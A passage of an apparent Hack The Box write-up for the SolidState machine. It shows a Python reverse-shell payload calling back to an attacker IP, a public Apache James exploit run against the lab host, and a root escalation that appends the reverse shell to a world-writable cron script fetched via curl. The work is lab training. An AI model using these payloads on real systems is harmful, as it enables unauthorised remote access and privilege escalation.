+payload <span class="o">=</span> <span class="s1">'python -c \'</span>import socket,subprocess,os<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.10.XX.XX"</span>,1337<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="se">\'</span><span class="s1">'
+...
+</span></pre></table></code></div></div><p>Now, we start our <code class="language-plaintext highlighter-rouge">nc</code> listener</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+</pre></table></code></div></div><p>And run the exploit.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python 35513.py solidstate.htb   
+<span class="o">[</span>+]Connecting to James Remote Administration Tool...
+<span class="o">[</span>+]Creating user...
+<span class="o">[</span>+]Connecting to James SMTP server...
+<span class="o">[</span>+]Sending payload...
+<span class="o">[</span>+]Done! Payload will be executed once somebody logs <span class="k">in</span><span class="nb">.</span>
+</pre></table></code></div></div><p>Now if we login as <code class="language-plaintext highlighter-rouge">mindy</code> again:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh mindy@solidstate.htb
+</pre></table></code></div></div><p>We will receive a reverse shell connection on our listener as <code class="language-plaintext highlighter-rouge">mindy</code>. However, our shell is no longer restricted!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.51] 43388
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mindy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mindy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>mindy<span class="o">)</span>
+</pre></table></code></div></div><h1 id="enumeration-2-1">Enumeration (2)</h1><p>Without much enumeration, I found some interesting files in <code class="language-plaintext highlighter-rouge">/opt</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /opt
+total 16
+drwxr-xr-x  3 root root 4096 Aug 22  2017 <span class="nb">.</span>
+drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
+drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
+<span class="nt">-rwxrwxrwx</span>  1 root root  318 Jan 14 09:26 tmp.py
+</pre></table></code></div></div><p>A file called <code class="language-plaintext highlighter-rouge">tmp.py</code> is owned by <code class="language-plaintext highlighter-rouge">root</code> and we can write to it! Lets check the contents.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">cat</span> /opt/tmp.py
+<span class="c">#!/usr/bin/env python</span>
+import os
+import sys
+try:
+     os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>
+except:
+     sys.exit<span class="o">()</span>
+</pre></table></code></div></div><p>It just recursively deletes files in <code class="language-plaintext highlighter-rouge">/tmp</code>. Lets monitor using <code class="language-plaintext highlighter-rouge">pspy</code> to see whether this file is indeed being executed by <code class="language-plaintext highlighter-rouge">root</code>!</p><p>After tranferring <code class="language-plaintext highlighter-rouge">pspy</code> over, we can start monitoring for new processes.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span>./pspy32
+...
+2021/01/14 09:24:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1743   | /usr/sbin/CRON <span class="nt">-f</span> 
+2021/01/14 09:24:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1744   | /usr/sbin/CRON <span class="nt">-f</span> 
+2021/01/14 09:24:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1745   | /bin/sh <span class="nt">-c</span> python /opt/tmp.py 
+2021/01/14 09:24:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1746   | python /opt/tmp.py 
+2021/01/14 09:24:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1747   | sh <span class="nt">-c</span> <span class="nb">rm</span> <span class="nt">-r</span> /tmp/<span class="k">*</span>
+</pre></table></code></div></div><p>We can now confirm that <code class="language-plaintext highlighter-rouge">tmp.py</code> is being executed by <code class="language-plaintext highlighter-rouge">root</code>!</p><h1 id="exploitation-2">Exploitation (2)</h1><p>All we have to do is just append a <code class="language-plaintext highlighter-rouge">python</code> reverse shell to <code class="language-plaintext highlighter-rouge">tmp.py</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl http://10.10.XX.XX/payload <span class="o">&gt;&gt;</span> /opt/tmp.py
+<span class="nv">$ </span><span class="nb">cat</span> /opt/tmp.py
+...
+import socket,subprocess,os<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.10.XX.XX"</span>,1337<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
+</pre></table></code></div></div><p>We then setup our <code class="language-plaintext highlighter-rouge">nc</code> listener again and we will eventually receive reverse shell as <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.51] 55858
+root@solidstate:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>The root flag is located in the home directory of <code class="language-plaintext highlighter-rouge">root</code>, as usual.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>root@solidstate:~# <span class="nb">cat</span> /root/root.txt
+4f4aXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/james/" class="post-tag no-text-decoration" >james</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - SolidState (Without Metasploit) - rizemon's blog&url=https://rizemon.github.io/posts/solidstate-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - SolidState (Without Metasploit) - rizemon's blog&u=https://rizemon.github.io/posts/solidstate-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - SolidState (Without Metasploit) - rizemon's blog&url=https://rizemon.github.io/posts/solidstate-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/dsonus2021-insecure-ctf/"><div class="card-body"> <span class="timeago small" > Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Insecure</h3><div class="text-muted small"><p> Description Someone once told me that SUID is a bad idea. Could you show me why? This challenge server can be accessed here: (Any one of the options below is fine) (Suggested access via ‘...</p></div></div></a></div><div class="card"> <a href="/posts/delivery-htb/"><div class="card-body"> <span class="timeago small" > May 23, 2021 <i class="unloaded">2021-05-23T03:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Delivery</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/swagshop-htb/"><div class="card-body"> <span class="timeago small" > Sep 29, 2019 <i class="unloaded">2019-09-29T10:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Swagshop</h3><div class="text-muted small"><p> This machine was not my first Linux machine but I had fun rooted this machine ! :D Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always rem...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/sense-htb/" class="btn btn-outline-primary"><p>Hack The Box - Sense (Without Metasploit)</p></a> <a href="/posts/node-htb/" class="btn btn-outline-primary"><p>Hack The Box - Node (Without Metasploit)</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
